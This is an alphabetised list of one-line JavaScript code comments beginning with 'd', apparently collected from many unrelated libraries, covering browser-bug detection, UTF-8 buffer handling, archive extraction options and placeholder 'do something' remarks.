// detect Safari bug with selected option elements
// detect buggy gEBID
// detect if DOM methods are native in browsers
// detect native methods
// detectIncompleteChar determines if there is an incomplete UTF-8 character at
// detection and lead to arbitrary writes to anywhere on the system.
// determine and set charLength / charReceived
// determine exact animation
// determine how many bytes we have to check at the end of this buffer
// determine how many remaining bytes this buffer has to offer for this char
// determine tab context
// determined by having the same number of owned properties (as verified
// determiner: 'must be' or 'must not be'
// determines popup state
// developer error
// diacritics and additional 'Yiddish' ligature letters in the range 0xc0-0xd6.
// didn't increment anything
// different delays (in ms) per item
// different than another field
// different types of agents are in different pools
// digits in this value following this digit.
// dir name starts with __MACOSX/
// directly after the root.
// directly represent `beforeInput`. The IE `textinput` event is not as
// directly start an expression (like a quotation mark) or can
// directly.
// directory
// directory file names end with '/'
// directory is >= 1.
// disable cookies
// disable truncating
// disabled by default for performance
// disabled with `removeAttribute`.
// disabled?
// disastrous mistake of forgetting to traverse a subtree. Also
// discard start
// disconnected or equal:
// displayed dropdown text
// displayed text when selected
// dispose of the old one before overwriting
// distance away from activating element in px
// distinguish between parens-free and paranthesized single param.
// do NOT remove this file - it would break pre-compiled schemas
// do `new Pack(opt).add('files').add('dir').end().pipe(output)
// do delete on constant value (not considering identifier in this tree based constant folding)
// do extended autolink path validation
// do not copy if src is a subdir of dest since unlinking
// do not edit .js files directly - edit src/index.jst
// do not modify the original
// do not set mtime/atime of extracted entries
// do not trigger if the window is closed
// do not unpack over ANY files
// do not unpack over files that are newer than what's in the archive
// do not use inline function because that will leak memory
// do nothing
// do nothing special yet
// do some more stuff ...
// do some more stuff but error ...
// do some stuff ...
// do something
// do something with the result
// do something with the results
// do stuff...
// do this. *SIGH*
// do what the spec says regarding anchor tags: just don't parse it
